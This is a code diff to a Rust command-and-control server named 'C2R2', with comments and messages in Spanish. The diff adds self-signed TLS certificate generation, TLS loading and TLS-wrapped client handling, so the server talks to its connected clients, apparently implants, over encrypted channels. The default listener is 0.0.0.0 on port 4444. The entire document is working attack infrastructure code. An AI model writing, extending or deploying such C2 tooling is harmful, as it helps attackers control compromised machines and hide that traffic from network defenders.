@@ -1,16 +1,21 @@
 use tokio::net::{TcpListener, TcpStream};
 use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
 use tokio::sync::mpsc;
+use tokio_rustls::TlsAcceptor;
+use tokio_rustls::server::TlsStream;
+use rustls::ServerConfig;
+use rustls::pki_types::CertificateDer;
 use std::collections::HashMap;
 use std::sync::{Arc, Mutex};
 use std::sync::atomic::{AtomicU64, Ordering};
-use std::path::{Path, PathBuf};
+use std::path::PathBuf;
 use std::env;
+use std::io::BufReader as StdBufReader;
 use clap::Parser;
 use chrono::Local;
 use colored::*;
 use prettytable::{Table, Row, Cell, format};
-use std::fs;
+use std::fs::{self, File};
 use rustyline::error::ReadlineError;
 use rustyline::DefaultEditor;
 use tracing::{info, warn, error, debug};
@@ -20,22 +25,29 @@ use tracing_appender::rolling::{RollingFileAppender, Rotation};
 type ClientId = u64;
 
 const DELIMITER: &str = "\n<<END>>\n";
+const CERTS_DIR: &str = "certs";
+const CERT_FILE: &str = "server.crt";
+const KEY_FILE: &str = "server.key";
 
 #[derive(Parser)]
 #[command(name = "c2r2-server")]
-#[command(about = "C2R2 Command & Control Server", long_about = None)]
+#[command(about = "C2R2 Command & Control Server with TLS", long_about = None)]
 struct Args {
     /// Dirección IP donde bindear (0.0.0.0 para todas las interfaces)
     #[arg(short, long, default_value = "0.0.0.0")]
     bind: String,
 
-    /// Puerto donde escuchar conexiones
+    /// Puerto donde escuchar conexiones TLS
     #[arg(short, long, default_value_t = 4444)]
     port: u16,
     
     /// Modo verboso
     #[arg(short, long)]
     verbose: bool,
+    
+    /// Genera nuevos certificados TLS (auto-firmados)
+    #[arg(long)]
+    generate_certs: bool,
 }
 
 // Información del cliente
@@ -101,6 +113,98 @@ fn get_modules_path() -> PathBuf {
     
     // Fallback: modules/ en directorio actual (aunque no exista)
     PathBuf::from("modules")
+}
+
+/// Genera certificados TLS auto-firmados para el servidor
+/// Esto crea un certificado válido para conexiones locales y la IP especificada
+fn generate_self_signed_certs(bind_addr: &str) -> Result<(), String> {
+    use rcgen::{CertifiedKey, generate_simple_self_signed};
+    
+    // Crear directorio de certificados
+    fs::create_dir_all(CERTS_DIR)
+        .map_err(|e| format!("Error creando directorio {}: {}", CERTS_DIR, e))?;
+    
+    // Generar nombres alternativos (SAN) para el certificado
+    let mut subject_alt_names = vec![
+        "localhost".to_string(),
+        "127.0.0.1".to_string(),
+    ];
+    
+    // Agregar la IP de bind si no es 0.0.0.0
+    if bind_addr != "0.0.0.0" && !subject_alt_names.contains(&bind_addr.to_string()) {
+        subject_alt_names.push(bind_addr.to_string());
+    }
+    
+    println!("{} Generando certificado para: {:?}", "🔐".bright_cyan(), subject_alt_names);
+    
+    // Generar certificado
+    let CertifiedKey { cert, key_pair } = generate_simple_self_signed(subject_alt_names)
+        .map_err(|e| format!("Error generando certificado: {}", e))?;
+    
+    // Guardar certificado
+    let cert_path = PathBuf::from(CERTS_DIR).join(CERT_FILE);
+    fs::write(&cert_path, cert.pem())
+        .map_err(|e| format!("Error guardando certificado: {}", e))?;
+    
+    // Guardar clave privada
+    let key_path = PathBuf::from(CERTS_DIR).join(KEY_FILE);
+    fs::write(&key_path, key_pair.serialize_pem())
+        .map_err(|e| format!("Error guardando clave privada: {}", e))?;
+    
+    println!("{} Certificado guardado en: {}", "✅".bright_green(), cert_path.display());
+    println!("{} Clave privada guardada en: {}", "✅".bright_green(), key_path.display());
+    
+    Ok(())
+}
+
+/// Carga los certificados TLS desde el directorio de certificados
+fn load_tls_config() -> Result<ServerConfig, String> {
+    let cert_path = PathBuf::from(CERTS_DIR).join(CERT_FILE);
+    let key_path = PathBuf::from(CERTS_DIR).join(KEY_FILE);
+    
+    // Verificar que existan los archivos
+    if !cert_path.exists() || !key_path.exists() {
+        return Err(format!(
+            "Certificados TLS no encontrados. Ejecuta con --generate-certs primero.\n\
+             Esperados:\n  - {}\n  - {}",
+            cert_path.display(),
+            key_path.display()
+        ));
+    }
+    
+    // Cargar certificados
+    let cert_file = File::open(&cert_path)
+        .map_err(|e| format!("Error abriendo certificado: {}", e))?;
+    let mut cert_reader = StdBufReader::new(cert_file);
+    let certs: Vec<CertificateDer<'static>> = rustls_pemfile::certs(&mut cert_reader)
+        .filter_map(|r| match r {
+            Ok(cert) => Some(cert),
+            Err(e) => {
+                eprintln!("⚠️  Warning: Error parseando certificado: {}", e);
+                None
+            }
+        })
+        .collect();
+    
+    if certs.is_empty() {
+        return Err("No se encontraron certificados válidos en el archivo".to_string());
+    }
+    
+    // Cargar clave privada
+    let key_file = File::open(&key_path)
+        .map_err(|e| format!("Error abriendo clave privada: {}", e))?;
+    let mut key_reader = StdBufReader::new(key_file);
+    let key = rustls_pemfile::private_key(&mut key_reader)
+        .map_err(|e| format!("Error leyendo clave privada: {}", e))?
+        .ok_or("No se encontró clave privada válida en el archivo")?;
+    
+    // Crear configuración TLS
+    let config = ServerConfig::builder()
+        .with_no_client_auth()
+        .with_single_cert(certs, key)
+        .map_err(|e| format!("Error configurando TLS: {}", e))?;
+    
+    Ok(config)
 }
 
 /// Parses a command line string respecting quotes (both single and double)
@@ -176,27 +280,21 @@ fn reconstruct_command(args: &[String]) -> String {
     result
 }
 
-// Maneja la comunicación con un cliente
+// Maneja la comunicación con un cliente TLS
 async fn handle_client(
     id: ClientId,
-    stream: TcpStream,
+    stream: TlsStream<TcpStream>,
+    addr: String,
     clients: Arc<Mutex<HashMap<ClientId, ClientHandle>>>,
     verbose: bool,
 ) {
-    let addr = match stream.peer_addr() {
-        Ok(addr) => addr.to_string(),
-        Err(e) => {
-            warn!("Cliente [{}] desconectado antes de obtener dirección: {}", id, e);
-            return; // Cliente ya desconectado, salir
-        }
-    };
-    
-    info!("Nueva conexión: [{}] desde {}", id, addr);
-    println!("{} {} {} {}", 
-        "🔗".bright_green(), 
-        "Nuevo cliente".bright_white().bold(),
+    info!("Nueva conexión TLS: [{}] desde {}", id, addr);
+    println!("{} {} {} {} {}", 
+        "🔐".bright_green(), 
+        "Nuevo cliente TLS".bright_white().bold(),
         format!("[{}]", id).bright_cyan().bold(),
-        format!("desde {}", addr).bright_white().dimmed()
+        format!("desde {}", addr).bright_white().dimmed(),
+        "(encriptado)".bright_green().dimmed()
     );
 
     let (tx, mut rx) = mpsc::unbounded_channel::<String>();
@@ -211,7 +309,8 @@ async fn handle_client(
         });
     }
 
-    let (reader, mut writer) = stream.into_split();
+    // Split the TLS stream into reader and writer
+    let (reader, mut writer) = tokio::io::split(stream);
     let mut reader = BufReader::new(reader);
 
     // Tarea para enviar comandos al cliente (sin keep-alive ping)
@@ -633,6 +732,27 @@ fn base64_encode(data: &[u8]) -> String {
 async fn main() {
     let args = Args::parse();
 
+    // Si se solicita generar certificados, hacerlo y salir
+    if args.generate_certs {
+        println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_cyan());
+        println!("{}", "║          C2R2 - Generador de Certificados TLS            ║".bright_cyan());
+        println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_cyan());
+        println!();
+        
+        match generate_self_signed_certs(&args.bind) {
+            Ok(_) => {
+                println!();
+                println!("{} Certificados generados exitosamente.", "✅".bright_green());
+                println!("{} Ahora puedes iniciar el servidor sin --generate-certs", "ℹ️ ".bright_cyan());
+            }
+            Err(e) => {
+                eprintln!("{} {}", "❌ Error:".bright_red(), e);
+                std::process::exit(1);
+            }
+        }
+        return;
+    }
+
     // Configurar el logger con archivos rotativos diarios
     let logs_dir = "logs";
     std::fs::create_dir_all(logs_dir).expect("No se pudo crear el directorio de logs");
@@ -661,21 +781,38 @@ async fn main() {
         .with_level(true)
         .init();
     
+    // Cargar configuración TLS
+    let tls_config = match load_tls_config() {
+        Ok(config) => config,
+        Err(e) => {
+            eprintln!("{} {}", "❌ Error TLS:".bright_red(), e);
+            eprintln!("{} Ejecuta primero: {} {}", 
+                "ℹ️ ".bright_cyan(),
+                "cargo run --package c2r2-server --".bright_white(),
+                "--generate-certs".bright_yellow()
+            );
+            std::process::exit(1);
+        }
+    };
+    
+    let tls_acceptor = TlsAcceptor::from(Arc::new(tls_config));
+    
     info!("╔══════════════════════════════════════════════════════════════╗");
-    info!("║          C2R2 Server v2.0 - Session Started                ║");
+    info!("║          C2R2 Server v2.0 TLS - Session Started            ║");
     info!("║          Listening: {}:{:<43}║", args.bind, args.port);
     info!("╚══════════════════════════════════════════════════════════════╝");
     info!("");
 
     // Banner con colores (solo en consola)
     println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_cyan());
-    println!("{}", "║          C2R2 - Command & Control Server v2.0            ║".bright_cyan());
-    println!("{}", "║              Direct Connection - No Shellcode            ║".bright_cyan());
+    println!("{}", "║       C2R2 - Command & Control Server v2.0 (TLS)         ║".bright_cyan());
+    println!("{}", "║          🔐 Conexiones Encriptadas con TLS 1.3           ║".bright_cyan());
     println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_cyan());
     println!();
-    println!("{} {}", "🌐 Listening:".bright_green().bold(), format!("{}:{}", args.bind, args.port).bright_white());
+    println!("{} {}", "🔐 TLS Listening:".bright_green().bold(), format!("{}:{}", args.bind, args.port).bright_white());
     println!("{} {}", "📝 Help:".bright_yellow().bold(), "/help".bright_white());
     println!("{} {}", "📂 Logs:".bright_yellow().bold(), format!("{}/", logs_dir).bright_white());
+    println!("{} {}", "🔑 Certs:".bright_yellow().bold(), format!("{}/", CERTS_DIR).bright_white());
     if args.verbose {
         println!("{}", "🔍 Verbose Mode: ON".bright_magenta());
     }
@@ -689,17 +826,33 @@ async fn main() {
     let next_id = Arc::new(AtomicU64::new(1));
     let selected_client: Arc<Mutex<Option<ClientId>>> = Arc::new(Mutex::new(None));
 
-    // Tarea para aceptar conexiones
+    // Tarea para aceptar conexiones TLS
     let clients_clone = clients.clone();
     let next_id_clone = next_id.clone();
     let verbose = args.verbose;
     tokio::spawn(async move {
         loop {
             match listener.accept().await {
-                Ok((stream, _)) => {
+                Ok((tcp_stream, peer_addr)) => {
                     let id = next_id_clone.fetch_add(1, Ordering::SeqCst);
                     let clients = clients_clone.clone();
-                    tokio::spawn(handle_client(id, stream, clients, verbose));
+                    let acceptor = tls_acceptor.clone();
+                    let addr = peer_addr.to_string();
+                    
+                    tokio::spawn(async move {
+                        // Realizar handshake TLS
+                        match acceptor.accept(tcp_stream).await {
+                            Ok(tls_stream) => {
+                                handle_client(id, tls_stream, addr, clients, verbose).await;
+                            }
+                            Err(e) => {
+                                if verbose {
+                                    eprintln!("{} TLS handshake fallido desde {}: {}", 
+                                        "⚠️ ".bright_yellow(), addr, e);
+                                }
+                            }
+                        }
+                    });
                 }
                 Err(e) => {
                     eprintln!("{} {}", "❌ Error:".bright_red().bold(), e);
